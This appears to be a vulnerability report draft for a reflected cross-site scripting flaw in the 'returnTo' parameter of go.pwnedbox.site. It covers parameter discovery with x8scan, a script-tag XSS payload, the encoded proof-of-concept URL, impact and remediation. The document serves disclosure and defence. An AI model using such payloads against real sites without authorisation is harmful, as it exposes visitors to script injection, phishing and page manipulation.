## Title

Reflected XSS Through the `returnTo` Parameter

## Description

**Affected URL:** https://go.pwnedbox.site/

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)

**Affected Parameter:** `returnTo`

The `returnTo` GET parameter was identified during parameter discovery with `x8scan`. The tool returned the transformed URL `https://go.pwnedbox.site/?returnTo=x8scan1`.

The parameter is used by the account confirmation page for the **Cancel & return** link. It should be checked to determine whether supplied input is safely encoded before being placed in the link's `href` attribute.

## Steps to Reproduce

1. Run the following command to discover GET parameters:

   ```bash
   echo "https://go.pwnedbox.site/" | x8scan
   ```

2. Confirm that `returnTo` appears in the transformed URL:

   ```text
   https://go.pwnedbox.site/?returnTo=x8scan1
   ```

3. Replace the test value with the following payload:

   ```html
   Yash'"<><SCripT>confirm("XSS");</SCripT>
   ```

4. Open the resulting URL in the browser.
5. Check whether a JavaScript confirmation dialog appears.
6. Inspect the **Cancel & return** link and verify whether the supplied value is reflected inside its `href` attribute without proper HTML attribute encoding.

## POC (Proof of Concept)

### Screenshot 1 – Hidden Parameter Discovered by x8scan

<!-- Add Screenshot 1 Here -->

### Screenshot 2 – Crafted URL and Account Confirmation Page

<!-- Add Screenshot 2 Here -->

### Screenshot 3 – JavaScript Confirmation Dialog

<!-- Add Screenshot 3 Here -->

### Screenshot 4 – Reflected Value in the href Attribute

<!-- Add Screenshot 4 Here -->

### Payload Used

```html
Yash'"<><SCripT>confirm("XSS");</SCripT>
```

### HTTP Request / URL

```http
https://go.pwnedbox.site/?returnTo=Yash%27%22%3C%3E%3CSCripT%3Econfirm%28%22XSS%22%29%3B%3C%2FSCripT%3E
```

## Impact

If the `returnTo` value is reflected into the `href` attribute without context-appropriate encoding, a crafted link may allow JavaScript execution when a visitor opens it.

Possible consequences include:

- **Page Manipulation:** Changing or adding content displayed to the visitor.
- **Phishing:** Showing deceptive content or forms.
- **Visitor-Targeted Attacks:** Sending crafted links to users to trigger the issue in their browsers.

**Actual Impact:** The supplied screenshot confirms that `x8scan` identified the `returnTo` parameter. JavaScript execution and reflection inside the `href` attribute must be confirmed with the remaining PoC evidence before reporting them as verified.

**Potentially Affected Users:** Visitors who open a crafted URL containing the `returnTo` parameter.

## Remediation

1. **Context-Aware Output Encoding:** HTML-attribute-encode the `returnTo` value before placing it in the `href` attribute.
2. **URL Validation:** Allow only expected, trusted return destinations and reject malformed or unexpected values.
3. **Safe Output Handling:** Avoid inserting raw user-controlled input into HTML attributes.
4. **Content Security Policy:** Apply a restrictive Content Security Policy (CSP) as an additional layer of protection.
